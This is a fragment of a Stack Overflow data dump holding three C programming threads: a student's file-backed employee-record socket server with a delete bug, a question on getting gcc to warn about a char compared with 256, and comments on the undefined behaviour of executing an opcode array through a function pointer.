%d\\n\",temp2.empid);\n                    printf(\"name is %s\\n\",temp2.name);\n                    int id,flag=0,i=1;\n\n                    //emp temp4;\n                    fd = fopen(\"/home/abc/Desktop/test34.txt\",\"r+\");\n                    if(fd==NULL)\n                    {\n                        printf(\"File cannot be opened\\n\");\n                        return 1;\n                    }\n                    id = temp2.empid;\n                    printf(\"id to search is %d\\n\",id);\n                    i=1;\n                    while(i&lt;=count)\n                    {\n                        fread(&amp;temp8.empid,sizeof(temp8.empid),1,fd);\n\n                        printf(\"Debbugging id read is %d\\n\",temp8.empid);\n\n\n                        if(temp2.empid==temp8.empid)\n                        {\n                            int size = ftell(fd);\n                            printf(\"pointer is at position %d\\n\",size);\n                            printf(\"emp id found\\n\");\n                            fseek(fd,size,SEEK_SET);                            \n                            printf(\"data to write is %s\\n\",temp2.name);\n                            fwrite(&amp;temp2.name,20,1,fd);\n                            memset(sbuf,0,sizeof(sbuf));\n                            strcpy(sbuf,UPDATED_RECORD);\n\n\n                            printf(\"Server-Echoing back to client...\\n\");\n                            rc = write(sd2, sbuf, sizeof(sbuf));\n                            flag=1;\n                            break;\n                        }\n                        i++;\n                    }//while inside if\n                    if(flag!=1)\n                    {\n                        memset(sbuf,0,sizeof(sbuf));\n                        strcpy(sbuf,EMP_NOT_FOUND);\n\n\n                        printf(\"Server-Echoing back to client...\\n\");\n                        rc = write(sd2, sbuf, sizeof(sbuf));\n\n                        printf(\"No emp found\");\n                        flag=0;\n                    }\n\n                    fclose(fd);\n                }//if update\n\n\n                if (temp2.operation==3)//display\n                {\n\n                    printf(\"In display\\n\");\n                    emp temp6;\n                    int i =1;\n                    fd = fopen(\"/home/abc/Desktop/test34.txt\",\"r+\");\n                    if(fd==NULL)\n                    {\n                        printf(\"File cannot be opened\\n\");\n                        return 1;\n                    }\n\n                    while(i&lt;=count)\n                    {\n                        fread(&amp;temp6.empid,sizeof(temp6.empid),1,fd);\n                        fread(&amp;temp6.name,sizeof(temp6.name),1,fd);\n                        printf(\"\\nid is  = %d name is = %s\\n\",temp6.empid,temp6.name);\n\n                        memset(sdata,0,sizeof(temp6));\n                        memcpy(sdata,&amp;temp6,sizeof(temp6));\n                        printf(\"temp2.empname is %s\\n\",temp2.name);\n                        rc = write(sd2, sdata, sizeof(temp6));//add a check here\n                        sleep(1);\n                        i++;\n                    }\n                    fclose(fd);\n\n\n                }//if display\n\n                if (temp2.operation==4)//delete record  - NOT YET COMPLETE\n                {\n\n                    printf(\"In case 4 THAT IS DELETE \\n\");\n                    int found =0,i=1;\n                    fd = fopen(\"/home/abc/Desktop/test34.txt\",\"r+\");\n                    if(fd==NULL)\n                    {\n                        printf(\"File cannot be opened\\n\");\n                        memset(sbuf,0,sizeof(sbuf));\n                        strcpy(sbuf,FILE_ERR);\n                        printf(\"sbuf is %s\\n\",sbuf);\n                        rc = write(sd2, sbuf, sizeof(sbuf));\n                        return 1;\n                    }\n                    fd1 = fopen(\"/home/abc/Desktop/test335.txt\",\"a+\");\n                    if(fd1==NULL)\n                    {\n                        printf(\"File cannot be opened\\n\");\n                        memset(sbuf,0,sizeof(sbuf));\n                        strcpy(sbuf,FILE_ERR);\n                        printf(\"sbuf is %s\\n\",sbuf);\n                        rc = write(sd2, sbuf, sizeof(sbuf));\n                        return 1;\n                    }\n\n                    printf(\"name to search is %s\\n\",temp2.name);\n                    printf(\"id to delete is %d\\n\",temp2.empid);\n                    emp temp7,temp10;\n                    memcpy(&amp;temp10,buffer,sizeof(temp10));\n                    printf(\"temp 10 id to delete is %d\\n\",temp10.empid);\n                    while(i&lt;=count){\n                        fread(&amp;temp7.empid,sizeof(temp7.empid),1,fd);\n                        fread(&amp;temp7.name,sizeof(temp7.name),1,fd);\n\n                        if(temp2.empid==temp7.empid){\n                            printf(\"A requested by name found and deleted\\n\");\n                            found = 1;\n                            count--;\n                        }else{\n                            fwrite(&amp;temp7,sizeof(temp7),2,fd1);\n                            }\n                        if(!found)\n                        {\n                            printf(\"cannot found the record\\n\");\n                        }\n                        i++;\n                    }\n                    fclose(fd);\n                    fclose(fd1);\n                    remove(\"/home/abc/Desktop/test34.txt\");\n                    rename(\"/home/abc/Desktop/test335.txt\",\"/home/tarun/Desktop/test34.txt\");\n                    memset(sbuf,0,sizeof(sbuf));\n                    strcpy(sbuf,DEL_OK);\n                    rc = write(sd2, sbuf, sizeof(sbuf));\n\n                //for debugging\n                fd = fopen(\"/home/abc/Desktop/test34.txt\",\"r+\");\n                    if(fd==NULL)\n                    {\n                        printf(\"File cannot be opened\\n\");\n                        return 1;\n                    }\n                i=0;\n                while(i&lt;=count)\n                    {\n                        fread(&amp;temp7.empid,sizeof(temp7.empid),1,fd);\n                        fread(&amp;temp7.name,sizeof(temp7.name),1,fd);\n\n                        printf(\"\\nid is  = %d name is = %s\\n\",temp7.empid,temp7.name);\n                        i++;\n                }\n\n                }// if delete record\n\n                /* When the data has been sent, close() */\n\n                /* the socket descriptor that was returned */\n\n                /* from the accept() verb and close() the */\n\n                /* original socket descriptor. */\n\n                /*****************************************/\n\n                /* Close the connection to the client and */\n\n                /* close the server listening socket. */\n\n                /******************************************/\n\n                if (temp2.operation==5)//close connection\n                {\n                    printf(\"client has asked to shutdown ... Its time to go bbye\\n\");\n                    close(sd2);\n\n                    close(sd);\n\n                    exit(0);\n\n                    return 0;\n                }\n            }\n        }\n</code></pre>\n\n<p>I have tryed to test all the cases possible.But i request if you have please review the code and comment where more checks can be added.\nAlso i am getting a problem in delete record after deleteing i am not able to get the exact values please tell me whats the issue</p>\n"}, {"tags": ["c", "gcc", "gcc-warning"], "comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 1, "creation_date": 1437588796, "post_id": 31570853, "comment_id": 51096605, "body": "1. <code>char</code> may be signed, in which case <code>CHAR_MAX</code> may be <code>127</code>. 2. <code>CHAR_BIT</code> may be bigger than 8, in which case <code>CHAR_MAX</code> may be bigger than <code>256</code>."}, {"owner": {"reputation": 139130, "user_id": 141172, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/Vuodg.jpg?s=128&g=1", "display_name": "Eric J.", "link": "https://stackoverflow.com/users/141172/eric-j"}, "edited": false, "score": 0, "creation_date": 1437588809, "post_id": 31570853, "comment_id": 51096611, "body": "Does <code>gcc -Wall</code> give an error/warning if you change 256 to 257?  The compiler might internally rewrite the comparison to &lt;= 255 and realize no warning is needed."}, {"owner": {"reputation": 301, "user_id": 4349614, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-rGQvLlUWH3o/AAAAAAAAAAI/AAAAAAAAABE/jIxaQ_wzPUA/photo.jpg?sz=128", "display_name": "Ternvein", "link": "https://stackoverflow.com/users/4349614/ternvein"}, "edited": false, "score": 0, "creation_date": 1437589011, "post_id": 31570853, "comment_id": 51096720, "body": "That&#39;s strange, cause my gcc 3.4.4 with <code>-Wall</code> always gave me warnings about always-true and always-false comparisons. You can also try <code>-Wpedantic</code>, though I don&#39;t think it should be needed."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1437594794, "post_id": 31570853, "comment_id": 51100260, "body": "Add <code>-Wextra</code> and <code>-Wconversion</code>."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1437595280, "post_id": 31570853, "comment_id": 51100563, "body": "Which version of GCC are you using? <a href=\"https://gcc.gnu.org/gcc-5/\" rel=\"nofollow noreferrer\">GCC 5.2</a> appeared in mid july 2015."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1437595702, "post_id": 31570853, "comment_id": 51100821, "body": "Side note: This highlights the troubles in C of using a type narrower than <code>int&#47;unsigned</code> for computation.  Code could/should have been <code>int&#47;unsigned i;</code>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437603897, "post_id": 31570853, "comment_id": 51104994, "body": "@chux: I agree for modern CPUs with 16 or 32 bit. However, for smaller systems (8 bit and even some 16 bit architectures), this is sometimes not an option and smaller types very well hint the compiler to optimize (the standard allows to perform operations with smaller size if the result will not change)."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1437605472, "post_id": 31570853, "comment_id": 51105579, "body": "@Olaf Agree using a narrow than <code>int</code> type` is good hint for a narrow CPU for optimization.  Yet specifying that narrow type could well limit optimization on a wider CPU when code is ported.  Maybe that is what <code>int_fast8_t</code> is for?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437606126, "post_id": 31570853, "comment_id": 51105775, "body": "@chux: You are right - in theory. In practice, any port to a different (possibly wider register) MCU will require most of the code to be re-written anyway (peripherals, use of RT-OS, clean structure not possible on small arch, etc. Even for a larger CPU this must times is only true for higher layers. Programming an 8-bitter or even 16 bitter is much different from ARM Cortex-M, e.g., not to talk about Full-size OS based. (and for existing code, I&#39;m already very happy to see <code>uint8_t</code> &amp; friends. Most engineers still use their own creatures - or even the standard types:-(."}], "answers": [{"tags": [], "owner": {"reputation": 2915, "user_id": 5136580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/42efea573d72921a6de90bef052c4879?s=128&d=identicon&r=PG&f=1", "display_name": "Mikel Rychliski", "link": "https://stackoverflow.com/users/5136580/mikel-rychliski"}, "is_accepted": true, "score": 6, "last_activity_date": 1437612158, "last_edit_date": 1437612158, "creation_date": 1437588891, "answer_id": 31570927, "question_id": 31570853, "link": "https://stackoverflow.com/questions/31570853/how-to-make-gcc-complain-about-comparison-of-char-with-256/31570927#31570927", "title": "How to make gcc complain about comparison of char with 256", "body": "<p><code>-Wtype-limits</code> (or <code>-Wextra</code>) should trigger this warning</p>\n"}, {"comments": [{"owner": {"reputation": 2531, "user_id": 3696619, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LueSz.jpg?s=128&g=1", "display_name": "Jay Bosamiya", "link": "https://stackoverflow.com/users/3696619/jay-bosamiya"}, "edited": false, "score": 0, "creation_date": 1437601382, "post_id": 31572832, "comment_id": 51103933, "body": "<code>-Wextra</code> gives a warning but <code>-Wconversion</code> does not, for this specific case."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 2531, "user_id": 3696619, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LueSz.jpg?s=128&g=1", "display_name": "Jay Bosamiya", "link": "https://stackoverflow.com/users/3696619/jay-bosamiya"}, "edited": false, "score": 0, "creation_date": 1437601650, "post_id": 31572832, "comment_id": 51104032, "body": "@JayBosamiya: &quot;... The first includes a warning for your actual probem, but ...&quot; I think that states it quite clear."}], "tags": [], "owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "is_accepted": false, "score": 1, "last_activity_date": 1437594982, "creation_date": 1437594982, "answer_id": 31572832, "question_id": 31570853, "link": "https://stackoverflow.com/questions/31570853/how-to-make-gcc-complain-about-comparison-of-char-with-256/31572832#31572832", "title": "How to make gcc complain about comparison of char with 256", "body": "<p>Add <code>-Wextra</code> and <code>-Wconversion</code>. The first includes a warning for your actual probem, but the latter will warn about many other related problems.</p>\n\n<p>But beware: <code>-Wconversion</code> will also warn about many other potential problems if your code is not well-written (signed/unsigned, etc). Best is to compile, see the warnings and carefully verify the listed lines, possibly adding casts (after thinking thrice if the code is correct!).</p>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1437595776, "creation_date": 1437595776, "answer_id": 31573042, "question_id": 31570853, "link": "https://stackoverflow.com/questions/31570853/how-to-make-gcc-complain-about-comparison-of-char-with-256/31573042#31573042", "title": "How to make gcc complain about comparison of char with 256", "body": "<p>I compiled the posted code with gcc, on ubuntu 14.04 linux using:</p>\n\n<pre><code>-Wall -Wextra -pedantic -std=c99\n</code></pre>\n\n<p>and the compiler output this warning:</p>\n\n<pre><code>warning: comparison is always true due to limited range of data type [-Wtype-limits]\n</code></pre>\n\n<p>Just one more reason to always enable all the warnings when compiling</p>\n"}], "owner": {"reputation": 2531, "user_id": 3696619, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LueSz.jpg?s=128&g=1", "display_name": "Jay Bosamiya", "link": "https://stackoverflow.com/users/3696619/jay-bosamiya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 771, "favorite_count": 0, "accepted_answer_id": 31570927, "answer_count": 3, "score": 2, "last_activity_date": 1437612158, "creation_date": 1437588629, "last_edit_date": 1492087139, "question_id": 31570853, "link": "https://stackoverflow.com/questions/31570853/how-to-make-gcc-complain-about-comparison-of-char-with-256", "title": "How to make gcc complain about comparison of char with 256", "body": "<p>I found the following code on <a href=\"https://codegolf.stackexchange.com/a/24639/36005\">codegolf.stackexchange</a> to print a code table for ASCII characters:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(){\n    char i;\n    for(i = 0; i &lt; 256; i++){\n        printf(\"%3d 0x%2x: %c\\n\", i, i, i);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>Since <code>char</code>s store single bytes in them, they are always <code>&lt; 256</code> and the loop never terminates. I would like to detect this upon compilation.</p>\n\n<p>Nicely, <code>clang</code> gives the following warning:</p>\n\n<pre><code>a.c:5:18: warning: comparison of constant 256 with expression of type 'char' is always true [-Wtautological-constant-out-of-range-compare]\nfor(i = 0; i &lt; 256; i++){\n           ~ ^ ~~~\n</code></pre>\n\n<p>However, neither <code>gcc</code> nor <code>gcc -Wall</code> give any warning of any sort. Is there any set of command line options I can give to turn on this kind of warnings? Or is it not possible in gcc?</p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 4, "creation_date": 1437588042, "post_id": 31570646, "comment_id": 51096123, "body": "The C standard does not make any guarantees for code like this."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 5, "creation_date": 1437588172, "post_id": 31570646, "comment_id": 51096199, "body": "A function pointer and a void* are distinct (incompatible) types, use inline assembly"}, {"owner": {"reputation": 1002, "user_id": 4905637, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff5ce2af8214323986fb6f7568482e48?s=128&d=identicon&r=PG&f=1", "display_name": "Dleep", "link": "https://stackoverflow.com/users/4905637/dleep"}, "edited": false, "score": 0, "creation_date": 1437588173, "post_id": 31570646, "comment_id": 51096201, "body": "basically your question is if a function pointer is a simple pointer or actually a double pointer in disguise?"}, {"owner": {"reputation": 5146, "user_id": 5089383, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d483ecc01086edbc775bd770c66b5e4?s=128&d=identicon&r=PG&f=1", "display_name": "JSF", "link": "https://stackoverflow.com/users/5089383/jsf"}, "edited": false, "score": 0, "creation_date": 1437588283, "post_id": 31570646, "comment_id": 51096274, "body": "opcodes makes more sense than &amp;opcodes, but the address itself should be the same and since you are casting it to a different pointer type, the type of the address also shouldn&#39;t matter."}, {"owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "edited": false, "score": 0, "creation_date": 1437588433, "post_id": 31570646, "comment_id": 51096362, "body": "Check out this post: <a href=\"http://stackoverflow.com/questions/31504984/executing-shellcode-segmentation-fault?noredirect=1#comment50975960_31504984\" title=\"executing shellcode segmentation fault\">stackoverflow.com/questions/31504984/&hellip;</a> . Might help."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 4, "creation_date": 1437588452, "post_id": 31570646, "comment_id": 51096373, "body": "The compiler and/or runtime may place the data in <code>opcodes</code> in memory that is marked &#39;not executable&#39;.  You may not be able to do what you&#39;re attempting to do.  It&#39;s all inherently unportable."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1437588704, "post_id": 31570646, "comment_id": 51096548, "body": "C does not define behavior for converting a void pointer or an object pointer to a function pointer, therefore your program exhibits undefined behavior, even if it never performs a function call via the converted pointer."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 2, "creation_date": 1437589228, "post_id": 31570646, "comment_id": 51096848, "body": "C may be compiled for Harvard architectures."}, {"owner": {"reputation": 187, "user_id": 4812957, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/8f86977dd7413222c45aa1aa7cf11d54?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/4812957/joe"}, "edited": false, "score": 0, "creation_date": 1437589300, "post_id": 31570646, "comment_id": 51096891, "body": "@DieterL&#252;cking Inline assembly and the opcodes are the same."}, {"owner": {"reputation": 187, "user_id": 4812957, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/8f86977dd7413222c45aa1aa7cf11d54?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/4812957/joe"}, "reply_to_user": {"reputation": 5146, "user_id": 5089383, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d483ecc01086edbc775bd770c66b5e4?s=128&d=identicon&r=PG&f=1", "display_name": "JSF", "link": "https://stackoverflow.com/users/5089383/jsf"}, "edited": false, "score": 0, "creation_date": 1437589316, "post_id": 31570646, "comment_id": 51096897, "body": "@JSF I&#39;m confused with what you said... I&#39;m asking in the thread if I&#39;m pointing to an address that is a pointer to opcodes or if I&#39;m pointing directly to opcodes."}, {"owner": {"reputation": 187, "user_id": 4812957, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/8f86977dd7413222c45aa1aa7cf11d54?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/4812957/joe"}, "reply_to_user": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "edited": false, "score": 0, "creation_date": 1437589328, "post_id": 31570646, "comment_id": 51096907, "body": "@PSkocik This isn&#39;t my question."}, {"owner": {"reputation": 187, "user_id": 4812957, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/8f86977dd7413222c45aa1aa7cf11d54?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/4812957/joe"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1437589331, "post_id": 31570646, "comment_id": 51096909, "body": "@JonathanLeffler I disable the protection in the compilation."}, {"owner": {"reputation": 187, "user_id": 4812957, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/8f86977dd7413222c45aa1aa7cf11d54?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/4812957/joe"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1437589718, "post_id": 31570646, "comment_id": 51097142, "body": "@JohnBollinger Must I use an int? And I call the function in the last line, fp();"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 1, "creation_date": 1437589827, "post_id": 31570646, "comment_id": 51097216, "body": "@Joe,  Sorry, inline assembly is something the compiler/assembler handles and makes part of the executable code.   The &#39;opcodes&#39; is just some data in the heap. (usually not allowed to execute on the heap)"}, {"owner": {"reputation": 5146, "user_id": 5089383, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d483ecc01086edbc775bd770c66b5e4?s=128&d=identicon&r=PG&f=1", "display_name": "JSF", "link": "https://stackoverflow.com/users/5089383/jsf"}, "edited": false, "score": 0, "creation_date": 1437589835, "post_id": 31570646, "comment_id": 51097221, "body": "@Joe, either way (with or without the &amp;) you are pointing directly to the opcodes.  There is no pointer to pointer involved.  I just double checked with gcc -S of your code with and without the &amp; that doesn&#39;t matter.  The generated code (.s file) is identical with or without the &amp; in the C source code."}, {"owner": {"reputation": 187, "user_id": 4812957, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/8f86977dd7413222c45aa1aa7cf11d54?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/4812957/joe"}, "reply_to_user": {"reputation": 5146, "user_id": 5089383, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d483ecc01086edbc775bd770c66b5e4?s=128&d=identicon&r=PG&f=1", "display_name": "JSF", "link": "https://stackoverflow.com/users/5089383/jsf"}, "edited": false, "score": 0, "creation_date": 1437590885, "post_id": 31570646, "comment_id": 51097912, "body": "@JSF I know the compiler optimize the executable, but I insist, I want know what I&#39;m doing."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1437591072, "post_id": 31570646, "comment_id": 51098036, "body": "@Joe, no, using <code>int</code> changes nothing.  C does not provide any defined way to execute data.  As others have suggested, this is what inline assembly is for, if your compiler provides such a facility."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1437591088, "post_id": 31570646, "comment_id": 51098056, "body": "Cast to <code>void(*)()</code>."}, {"owner": {"reputation": 5146, "user_id": 5089383, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4d483ecc01086edbc775bd770c66b5e4?s=128&d=identicon&r=PG&f=1", "display_name": "JSF", "link": "https://stackoverflow.com/users/5089383/jsf"}, "edited": false, "score": 0, "creation_date": 1437591291, "post_id": 31570646, "comment_id": 51098183, "body": "@Joe, I had optimization off.  This is not an optimization I am describing.  The meaning of your code really is the same with or without that &amp;.  &amp;opcodes does not imply the creation of a temporary holding the address opcodes.  opcodes itself is an address and &amp;opcodes is that same address but with a weird type."}, {"owner": {"reputation": 187, "user_id": 4812957, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/8f86977dd7413222c45aa1aa7cf11d54?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/4812957/joe"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1437591301, "post_id": 31570646, "comment_id": 51098192, "body": "@JohnBollinger lol, in all systems the exploits are made with C and opcodes :/ But ok... strange"}, {"owner": {"reputation": 8617, "user_id": 3477950, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mC5xL.jpg?s=128&g=1", "display_name": "The Paramagnetic Croissant", "link": "https://stackoverflow.com/users/3477950/the-paramagnetic-croissant"}, "edited": false, "score": 0, "creation_date": 1437591396, "post_id": 31570646, "comment_id": 51098257, "body": "@Joe yes, they are. And they all are built upon undefined behavior."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 2, "creation_date": 1437591566, "post_id": 31570646, "comment_id": 51098357, "body": "@Joe, C does not provide any <i>defined</i> way.  Exploits that follow the route you describe rely on triggering undefined behavior that in practice happens to favor the attacker at least some of the time.  That doesn&#39;t make them reliable.  It does make such vectors something that compilers and operating systems try to disable, which is an independent reason why you should not rely on executing data as code."}, {"owner": {"reputation": 3420, "user_id": 1530134, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/d6b1b610a6302fd94ff9f8971a4f1899?s=128&d=identicon&r=PG", "display_name": "Alyssa Haroldsen", "link": "https://stackoverflow.com/users/1530134/alyssa-haroldsen"}, "edited": false, "score": 0, "creation_date": 1437591664, "post_id": 31570646, "comment_id": 51098425, "body": "@Joe <a href=\"https://stackoverflow.com/questions/18476002/execute-binary-machine-code-from-c\">This</a> might be useful if you&#39;re using GCC. However, this is very compiler specific."}, {"owner": {"reputation": 187, "user_id": 4812957, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/8f86977dd7413222c45aa1aa7cf11d54?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/4812957/joe"}, "edited": false, "score": 0, "creation_date": 1437593687, "post_id": 31570646, "comment_id": 51099660, "body": "Ok, guys. It&#39;s a bad practice. This runs but you say the standard don&#39;t accept this. Ok, it&#39;s useful, but I&#39;m asking another issue."}], "answers": [{"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": 